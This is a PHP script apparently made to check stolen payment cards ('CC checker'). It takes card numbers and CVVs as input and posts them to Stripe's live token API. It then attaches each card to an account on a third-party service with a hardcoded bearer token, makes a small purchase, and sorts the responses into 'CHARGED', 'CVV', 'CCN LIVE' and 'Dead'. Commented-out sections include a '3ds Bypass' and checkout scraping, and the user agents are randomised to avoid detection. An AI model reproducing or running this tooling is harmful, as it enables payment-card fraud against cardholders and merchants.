<?php

############Kingsahil##########
############[PHP SETUP]#############

          error_reporting(0);
          set_time_limit(0);
          error_reporting(0);
          date_default_timezone_set('America/Buenos_Aires');

          // https://www.gosh.org/_donate/?amount=1&frequency=single&campaign=1856

 

#########################[Functions + Lista]############################
         
          function multiexplode($delimiters, $string){
                  $one = str_replace($delimiters, $delimiters[0], $string);
                  $two = explode($delimiters[0], $one);
          return $two;}

                  $lista = $_GET['lista'];
                  $cc   = multiexplode(array(":", "|", " "), $lista)[0];
                  $mes  = multiexplode(array(":", "|", " "), $lista)[1];
                  $ano = multiexplode(array(":", "|", " "), $lista)[2];
                  $cvv  = multiexplode(array(":", "|", " "), $lista)[3];
                  
          function GetStr($string, $start, $end){
                  $str = explode($start, $string);
                  $str = explode($end, $str[1]);
          return $str[0];}

                  $amount = 'Charge : $'.rand(3,7).'.'.rand(01,99);
                  $amount2 = 'Not Charged';

          function value($str,$find_start,$find_end){
                  $start = @strpos($str,$find_start);
          if ($start === false){
          return "";}
                  $length = strlen($find_start);
                  $end    = strpos(substr($str,$start +$length),$find_end);
          return trim(substr($str,$start +$length,$end));}
          function mod($dividendo,$divisor){
          return round($dividendo - (floor($dividendo/$divisor)*$divisor));}

          function AllinOne($data = 42){
                return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);};
           

#####################################

                  $guid = AllinOne();
                  $muid = AllinOne();
                  $sid = AllinOne();

#####################################
                  $time_on_page  = ucfirst(str_shuffle('67818'));
                  $z1  = substr($cc,0,3);
                  $z2  = substr($cc,3,6);

###################################[cs_live take]#####################
   // $ch = curl_init();
   //      curl_setopt($ch, CURLOPT_URL, 'https://opmodz.com/?wc-ajax=checkout');
   //      curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
   //      curl_setopt($ch, CURLOPT_HEADER, 0);
   //      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   //             'method: POST',
   //             'scheme: https',
   //             'accept: application/json, text/javascript, */*; q=0.01',
   //             'accept-language: en-US,en;q=0.9',
   //             'content-type: application/x-www-form-urlencoded; charset=UTF-8',
   //        'Cookie: PHPSESSID=mddprkodk6eqnhuic1frd7np0r; crisp-client%2Fsession%2F2ae13667-397d-4cd5-87b5-c740a35913e7=session_78c4b7b2-f243-4a82-a777-2653393edfc7; woocommerce_items_in_cart=1; wp_woocommerce_session_2e112a96a16e1d63e6933dc5f7c285f5=t_6e9bde04085c008c3e698ae0544def%7C%7C1676519953%7C%7C1676516353%7C%7Ccf1d74c2c68d85cf58070e6ccaf741b5; woocommerce_cart_hash=56b61c6e24da1849eef63c426241cbc8',
   //             'origin: https://opmodz.com',
   //             'referer: https://opmodz.com/checkout/',
   //             'sec-fetch-dest: empty',
   //             'sec-fetch-mode: cors',
   //             'sec-fetch-site: same-origin',
   //             'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
   //      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
   //      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   //      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
   //      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
   //      curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Mike&billing_last_name=smih&billing_country=US&billing_email=povehec542%40moneyzon.com&account_password=&discord=&order_comments=&payment_method=eh_stripe_checkout&terms=on&terms-field=1&woocommerce-process-checkout-nonce=165a968579&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');


   //             $get_cslive = curl_exec($ch);
   //          $cslive = 
   //  Getstr($get_cslive,'https:\/\/checkout.stripe.com\/c\/pay\/','#');
    
      
#########################[1 REQ]############################


        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: api.stripe.com',
               'method: POST',
               'path: /v1/tokens',
               'scheme: https',
               'accept: application/json',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded',
               'origin: https://js.stripe.com',
               'referer: https://js.stripe.com/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]=&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]=10080&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F80b922db8%3B+stripe-js-v3%2F80b922db8&time_on_page=65315&key=pk_live_CGs0xz5CvWKEDSS0WYsxE7or&pasted_fields=number');
        
        $r1 = curl_exec($ch);
        $id = Getstr($r1,'"id": "','"');

############################[2 Req]############################
 
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.runwayml.com/v1/profile/add_stripe_card');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: artistsspace.org',
               'method: POST',
               'path: /payment',
               'scheme: https',
               'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
               'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTM4NDE4NSwiZW1haWwiOiJqbmV3ZmlneGpzZHJrQGV1cm9rb29sLmNvbSIsImV4cCI6MTY3OTkyNDM2Ni44NTksImlhdCI6MTY3NzMzMjM2Ni44NTl9.Uxc7t7dApPzqq6z8SGPXmNwDjVpx4W8sd888d9442Ck',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/json',
               'origin: https://app.runwayml.com',
               'referer: https://app.runwayml.com/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"source":"'.$id.'"}');
        
        $r2 = curl_exec($ch);
    $rm_id = Getstr($r2,'"id": "','"');

#####################[3ds Bypass using url]#############
if (strpos($r2, "fingerprint")) 
{
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.runwayml.com/v1/billing/buy_credits');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: artistsspace.org',
               'method: POST',
               'path: /payment',
               'scheme: https',
               'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
               'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTM4NDE4NSwiZW1haWwiOiJqbmV3ZmlneGpzZHJrQGV1cm9rb29sLmNvbSIsImV4cCI6MTY3OTkyNDM2Ni44NTksImlhdCI6MTY3NzMzMjM2Ni44NTl9.Uxc7t7dApPzqq6z8SGPXmNwDjVpx4W8sd888d9442Ck',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/json',
               'origin: https://app.runwayml.com',
               'referer: https://app.runwayml.com/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"paymentProcessor":"stripe","amount":100}');
        
        $missleading = curl_exec($ch);
         // echo $missleading;
  echo "<b>missleading=</b>$missleading<br><br>";

  $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.runwayml.com/v1/profile/remove_stripe_card');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: artistsspace.org',
               'method: POST',
               'path: /payment',
               'scheme: https',
               'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
               'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTM4NDE4NSwiZW1haWwiOiJqbmV3ZmlneGpzZHJrQGV1cm9rb29sLmNvbSIsImV4cCI6MTY3OTkyNDM2Ni44NTksImlhdCI6MTY3NzMzMjM2Ni44NTl9.Uxc7t7dApPzqq6z8SGPXmNwDjVpx4W8sd888d9442Ck',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/json',
               'origin: https://app.runwayml.com',
               'referer: https://app.runwayml.com/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cardID":"'.$rm_id.'"}');

     $rm_data = curl_exec($ch);
        echo "<b>rm_data=</b>$rm_data<br><br>";
  
             
}
// #####################[3ds Bypass using url]#############
// if (strpos($r2, "three_d_secure_2_source"))   
// {
//                 $ch = curl_init();
//         curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
//         curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//         curl_setopt($ch, CURLOPT_HEADER, 0);
//         curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//                'authority: api.stripe.com',
//                'method: POST',
//                'path: /v1/3ds2/authenticate',
//                'scheme: https',
//                'accept: application/json',
//                'accept-language: en-US,en;q=0.9',
//                'content-type: application/x-www-form-urlencoded',
//                'origin: https://js.stripe.com',
//                'referer: https://js.stripe.com/',
//                'sec-fetch-dest: empty',
//                'sec-fetch-mode: cors',
//                'sec-fetch-site: same-origin',
//                'sec-gpc: 1',
//                'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
//         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//         curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$src.'&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22864%22%2C%22browserScreenWidth%22%3A%221536%22%2C%22browserTZ%22%3A%22-330%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F109.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51HP2WxDtYuzMl8oxGIjU2GakXYVkZvUJMOVRokOJ97g7VNGLb5FVP5CIRQjU5JnOcqeqW4XEFOp2rTNa92oTfRZ100avSDHKRk');
        
//         $srcresult = curl_exec($ch);
      
//   }
// ########################[result url]#####################

//     $ch = curl_init();
//           curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key=pk_live_51HP2WxDtYuzMl8oxGIjU2GakXYVkZvUJMOVRokOJ97g7VNGLb5FVP5CIRQjU5JnOcqeqW4XEFOp2rTNa92oTfRZ100avSDHKRk&is_stripe_sdk=false&client_secret='.$client_secret.'');
//           curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//                   $result31 = curl_exec($ch);


########################[Responses]############################
///// [2REQ - RSOP]

if(strpos($r2,'"status": "succeeded')){
  $status = '#CHARGED';
  $cc_code = '『 CHARGE PASS✅= 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2,'Membership Confirmation')){
  $status = '#CHARGED';
  $cc_code = '『 CHARGE PASS✅= 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2,'Thank you for your support')){
  $status = '#CHARGED';
  $cc_code = '『 CHARGE PASS✅= 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2,'Thank you for your donation')){
  $status = '#CHARGED';
  $cc_code = '『 CHARGE PASS✅= 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2,'/wishlist-member/?reg=')){
  $status = '#CHARGED';
  $cc_code = '『 CHARGE PASS✅= 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, 'Thank You')) {
  $status = '#CHARGED';
  $cc_code = '『 CHARGE PASS✅= 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, '\"success\":true')) {
  $status = '#CHARGED';
  $cc_code = '『 CHARGE PASS✅= 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, 'pass')) {
  $status = '#CHARGED';
  $cc_code = '『 CHARGE PASS✅= 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, 'wcf-key')) {
 $status = '#CHARGED';
  $cc_code = '『 CHARGE PASS✅= 』';
  $reqfind = '2 Req';

  
}

elseif(strpos($r2, 'incorrect_zip')) {
  $status = '#CVV';
  $cc_code = '『 incorrect_zip ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, 'transaction_not_allowed')) {
  $status = '#CVV';
  $cc_code = '『 transaction_not_allowed ✅ 』';
  $reqfind = '2 Req';
}
elseif (strpos($r2,'Your card does not support this type of purchase.')) {
  $status = 'Dead❌';
  $cc_code = '『 Your card does not support this type of purchase ✅ 』';
  $reqfind = '2 Req';
}
elseif (strpos($r2,'card does not support this type of purchase.')) {
  $status = 'Dead❌';
  $cc_code = '『 Your card does not support this type of purchase ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, '\"cvc_check\": \"pass\"')) {
  $status = '#CVV';
  $cc_code = '『 CVC_CHECK: PASS ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, 'Your card has Insufficient Funds.')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, 'card has Insufficient Funds.')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, 'insufficient_funds')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}
  elseif(strpos($r2, 'insufficient funds')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "security code is incorrect." )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "security code is invalid" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "Security code is incorrect" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "incorrect_cvc" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "card_decline_rate_limit_exceeded" )) {
  $status = 'Dead❌';
  $cc_code = '『 card_decline_rate_limit_exceeded 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "Your card is not supported" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card is not supported 』';
  $reqfind = '2 Req';
}
  elseif(strpos($r2, "card has expired" )) {
  $status = 'Dead❌';
  $cc_code = '『 card has expired 』';
  $reqfind = '2 Req';
}
  elseif(strpos($r2, "card is not supported" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card is not supported 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "Your card was declined" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card was declined 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "fraudulent" )) {
  $status = 'Dead❌';
  $cc_code = '『 fraudulent 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "-----BEGIN CERTIFICATE-----" )) {
  $status = 'Dead❌';
  $cc_code = '『 3ds OTP 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "do_not_honor" )) {
  $status = 'Dead❌';
  $cc_code = '『 do_not_honor 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "generic_decline" )) {
  $status = 'Dead❌';
  $cc_code = '『 generic_decline 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "card was declined" )) {
  $status = 'Dead❌';
  $cc_code = '『 card was declined 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "Your card number is incorrect" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card number is incorrect 』';
  $reqfind = '2 Req';
}
  elseif(strpos($r2, "card number is incorrect" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card number is incorrect 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "pickup_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Pickup Card (Reported Stolen Or Lost 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "payment_intent_authentication_failure" )) {
  $status = 'Dead❌';
  $cc_code = '『 The provided PaymentMethod has failed authentication 』';
  $reqfind = '2 Req';
}
  elseif(strpos($r1, "card_decline_rate_limit_exceeded" )) {
  $status = 'Dead❌';
  $cc_code = '『 card_decline_rate_limit_exceeded 』';
  $reqfind = '2 Req';
}
elseif(strpos($r1, "Your card is not supported" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card is not supported 』';
  $reqfind = '2 Req';
}
  elseif(strpos($r1, "card has expired" )) {
  $status = 'Dead❌';
  $cc_code = '『 card has expired 』';
  $reqfind = '2 Req';
}
  elseif(strpos($r1, "card is not supported" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card is not supported 』';
  $reqfind = '2 Req';
}
elseif(strpos($r1, "Your card was declined" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card was declined 』';
  $reqfind = '2 Req';
}
elseif(strpos($r1, "fraudulent" )) {
  $status = 'Dead❌';
  $cc_code = '『 fraudulent 』';
  $reqfind = '2 Req';
}
elseif(strpos($r1, "-----BEGIN CERTIFICATE-----" )) {
  $status = 'Dead❌';
  $cc_code = '『 3ds OTP 』';
  $reqfind = '2 Req';
}
elseif(strpos($r1, "do_not_honor" )) {
  $status = 'Dead❌';
  $cc_code = '『 do_not_honor 』';
  $reqfind = '2 Req';
}
elseif(strpos($r1, "generic_decline" )) {
  $status = 'Dead❌';
  $cc_code = '『 generic_decline 』';
  $reqfind = '2 Req';
}
elseif(strpos($r1, "card was declined" )) {
  $status = 'Dead❌';
  $cc_code = '『 card was declined 』';
  $reqfind = '2 Req';
}
elseif(strpos($r1, "Your card number is incorrect" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card number is incorrect 』';
  $reqfind = '2 Req';
}
  elseif(strpos($r1, "card number is incorrect" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card number is incorrect 』';
  $reqfind = '2 Req';
}
elseif(strpos($r1, "pickup_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Pickup Card (Reported Stolen Or Lost 』';
  $reqfind = '2 Req';
}
elseif(strpos($r1, "payment_intent_authentication_failure" )) {
  $status = 'Dead❌';
  $cc_code = '『 The provided PaymentMethod has failed authentication 』';
  $reqfind = '2 Req';
}
else{
  $status = 'Dead❌';
  $cc_code = '『 Problem Not Detected Form Ur cards 』';
  $reqfind = '2 Req';
}





//=======================[Responses-END]==============================//


    echo '</br>'.$MADEBY.' ['.$status.'] '.$lista.''.$cc_code.''.$bindata1.'</br>';

    echo "<b>Last result=</b>$r2<br><br>";
//sleep(2)
   
?> 